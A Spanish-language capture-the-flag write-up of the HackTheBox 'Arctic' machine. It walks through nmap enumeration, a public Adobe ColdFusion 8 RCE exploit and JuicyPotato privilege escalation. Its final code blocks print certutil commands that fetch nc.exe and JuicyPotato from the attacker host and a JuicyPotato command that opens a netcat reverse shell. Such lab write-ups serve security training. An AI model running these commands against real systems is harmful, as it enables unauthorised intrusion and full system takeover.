# Arctic

![](../../../../~gitbook/image.md)Publicado: 15 de Junio de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Easy
###📝 Descripción
Arctic es una máquina Windows de nivel fácil de HackTheBox que ejecuta Adobe ColdFusion 8, un servidor de aplicaciones web vulnerable. La explotación inicial se realiza aprovechando una vulnerabilidad de ejecución remota de código (RCE) en ColdFusion 8, que nos permite obtener acceso como usuario de bajo privilegio. La escalada de privilegios se logra mediante el exploit JuicyPotato, aprovechando el privilegio SeImpersonatePrivilege en Windows Server 2008.Puntos clave de aprendizaje:- Enumeración de servicios web no estándar
- Explotación de Adobe ColdFusion 8 RCE
- Escalada de privilegios con JuicyPotato
- Uso del privilegio SeImpersonatePrivilege

###🔭 Reconocimiento

####🏓 Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 128 sugiere que probablemente sea una máquina Windows.
####🚀 Escaneo de puertos

####🔍 Enumeración de servicios
Puertos identificados:- 135/tcp: Microsoft Windows RPC
- 8500/tcp: Servicio desconocido (fmtp?)
- 49154/tcp: Microsoft Windows RPC

###🌐 Enumeración Web

####🔥 Puerto 8500 - Adobe ColdFusion
La enumeración con nmap no deja claro qué tipo de servicio es, pero al acceder a él como si de un servicio http se tratase vemos que lo carga correctamente aunque con bastante lentitudy vemos lo siguiente![](../../../../~gitbook/image.md)Al ingresar al directorio CFIDE vemos el siguiente árbol de directorios![](../../../../~gitbook/image.md)
####🔐 Panel de administración ColdFusion
Al acceder a "administrator" vemos que somos redirigidos a un panel de login de un servicio de Adobe ColdFusion 8: `http://10.10.10.11:8500/CFIDE/administrator/`http://10.10.10.11:8500/CFIDE/administrator/![](../../../../~gitbook/image.md)Las credenciales por defecto no parecen funcionar. Pero buscando exploits públicos para la versión de este servicio encontramos un exploit en python que permite explotar una RCE:
###💥 Explotación

####🎯 Búsqueda de exploits
![](../../../../~gitbook/image.md)
####🚀 Configuración del exploit
Una vez descargado el exploit deberemos definir los parámetros correspondientes al host que contiene el servicio vulnerable así como la ip y el puerto de nuestro host de ataque donde recibiremos la reverse shell:![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)
####🎉 Acceso inicial
Ganamos acceso al host remoto como usuario tolis:![](../../../../~gitbook/image.md)
###⬆️ Escalada de privilegios
Al enumerar los privilegios del usuario Solis vemos que tiene el privilegio SeImpersonatePrivilege habilitado:![](../../../../~gitbook/image.md)
####🥔 JuicyPotato Exploit
Dado que se trata de un Windows Server 2008 podemos usar JuicyPotato para escalar privilegios como NT System:![](../../../../~gitbook/image.md)Descargamos y transferimos netcat y el exploit de JuicyPotato a la máquina Windows ServerIniciamos un listener en nuestro host de ataque:
####🚀 Ejecución del exploit
Ejecutamos el exploit JuicyPotato usando netcat para establecer una reverse shell con nuestro host de ataque:![](../../../../~gitbook/image.md)Recibimos inmediatamente la reverse shell en nuestro host de ataque como NT System y obtenemos la flag:![](../../../../~gitbook/image.md)Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración Web](#enumeracion-web)
- [💥 Explotación](#explotacion)
- [⬆️ Escalada de privilegios](#escalada-de-privilegios)

```
❯  ping -c2 10.10.10.11
PING 10.10.10.11 (10.10.10.11) 56(84) bytes of data.
64 bytes from 10.10.10.11: icmp_seq=1 ttl=127 time=47.0 ms
64 bytes from 10.10.10.11: icmp_seq=2 ttl=127 time=45.5 ms

--- 10.10.10.11 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1017ms
rtt min/avg/max/mdev = 45.473/46.221/46.970/0.748 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.11 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
echo $ports
135,8500,49154
```

```
nmap -sC -sV -p$ports 10.10.10.11 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-15 20:27 CEST
Nmap scan report for 10.10.10.11
Host is up (0.047s latency).

PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

```
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
```

```
C:\>mkdir Temp
mkdir Temp
C:\>cd Temp
cd TEmp
C:\Temp>mkdir Privesc
mkdir Privesc

certutil -urlcache -f -split http://10.10.14.7/nc.exe
certutil -urlcache -f -split http://10.10.14.7/JP.exe
```

```
nc -nlvp 443
```

```
JP.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\Temp\Privesc\nc.exe -e cmd 10.10.14.7 443"
```
